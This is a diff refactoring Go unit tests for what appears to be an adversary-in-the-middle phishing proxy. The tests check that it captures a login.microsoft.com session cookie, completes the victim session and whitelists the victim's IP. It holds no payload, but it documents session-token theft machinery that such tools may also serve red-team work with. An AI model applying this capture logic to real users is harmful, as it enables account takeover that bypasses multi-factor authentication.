@@ -373,31 +373,36 @@ func TestCookieRewriter_NoDomain_PassesThrough(t *testing.T) {
 
 // ---- TokenExtractor ---------------------------------------------------------
 
-type stubTokenStore struct {
-	updated *aitm.Session
-	err     error
+type stubSessionCompleter struct {
+	updated   *aitm.Session
+	completed bool
+	complete  bool // return value for IsComplete
+	err       error
 }
 
-func (s *stubTokenStore) UpdateSession(sess *aitm.Session) error {
+func (s *stubSessionCompleter) Update(sess *aitm.Session) error {
 	s.updated = sess
 	return s.err
 }
 
-type stubCompleter struct{ complete bool }
+func (s *stubSessionCompleter) Complete(_ *aitm.Session) error {
+	s.completed = true
+	return s.err
+}
 
-func (s *stubCompleter) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool { return s.complete }
+func (s *stubSessionCompleter) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool {
+	return s.complete
+}
 
 type stubWhitelister struct{ ip string }
 
 func (s *stubWhitelister) WhitelistTemporary(ip string, _ time.Duration) { s.ip = ip }
 
 func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
-	store := &stubTokenStore{}
+	sessions := &stubSessionCompleter{complete: false}
 	h := &response.TokenExtractor{
-		Store:     store,
-		Bus:       &stubBus{},
-		Completer: &stubCompleter{complete: false},
-		Logger:    discardLogger(),
+		Sessions: sessions,
+		Logger:   discardLogger(),
 	}
 	resp := newResp(http.StatusOK, "text/html", "")
 	resp.Header.Add("Set-Cookie", "authToken=secret; Domain=login.microsoft.com; Path=/")
@@ -414,7 +419,7 @@ func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
 	if err := h.Handle(ctx, resp); err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if store.updated == nil {
+	if sessions.updated == nil {
 		t.Fatal("expected session to be updated after token capture")
 	}
 	if _, ok := ctx.Session.CookieTokens["login.microsoft.com"]["authToken"]; !ok {
@@ -423,12 +428,10 @@ func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
 }
 
 func TestTokenExtractor_NoPhishlet_Skips(t *testing.T) {
-	store := &stubTokenStore{}
+	sessions := &stubSessionCompleter{}
 	h := &response.TokenExtractor{
-		Store:     store,
-		Bus:       &stubBus{},
-		Completer: &stubCompleter{},
-		Logger:    discardLogger(),
+		Sessions: sessions,
+		Logger:   discardLogger(),
 	}
 	resp := newResp(http.StatusOK, "text/html", "")
 	resp.Header.Add("Set-Cookie", "tok=x; Path=/")
@@ -436,18 +439,16 @@ func TestTokenExtractor_NoPhishlet_Skips(t *testing.T) {
 	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if store.updated != nil {
+	if sessions.updated != nil {
 		t.Error("expected no store update when phishlet is nil")
 	}
 }
 
-func TestTokenExtractor_SessionCompleted_PublishesEvent(t *testing.T) {
-	bus := &stubBus{}
+func TestTokenExtractor_SessionCompleted(t *testing.T) {
+	sessions := &stubSessionCompleter{complete: true}
 	whitelister := &stubWhitelister{}
 	h := &response.TokenExtractor{
-		Store:     &stubTokenStore{},
-		Bus:       bus,
-		Completer: &stubCompleter{complete: true},
+		Sessions:  sessions,
 		Whitelist: whitelister,
 		Logger:    discardLogger(),
 	}
@@ -461,28 +462,11 @@ func TestTokenExtractor_SessionCompleted_PublishesEvent(t *testing.T) {
 	if err := h.Handle(ctx, resp); err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if ctx.Session.CompletedAt == nil {
-		t.Error("expected CompletedAt to be set on session completion")
-	}
-	if !bus.published(aitm.EventSessionCompleted) {
-		t.Error("expected EventSessionCompleted to be published")
+	if !sessions.completed {
+		t.Error("expected Complete to be called on session completion")
 	}
 	if whitelister.ip != "1.2.3.4" {
 		t.Errorf("expected IP 1.2.3.4 to be whitelisted, got %q", whitelister.ip)
 	}
 }
 
-// stubBus is a minimal event bus for tests that need to inspect published events.
-type stubBus struct{ events []aitm.Event }
-
-func (b *stubBus) Publish(e aitm.Event)                              { b.events = append(b.events, e) }
-func (b *stubBus) Subscribe(_ aitm.EventType) <-chan aitm.Event      { return make(chan aitm.Event, 1) }
-func (b *stubBus) Unsubscribe(_ aitm.EventType, _ <-chan aitm.Event) {}
-func (b *stubBus) published(t aitm.EventType) bool {
-	for _, e := range b.events {
-		if e.Type == t {
-			return true
-		}
-	}
-	return false
-}
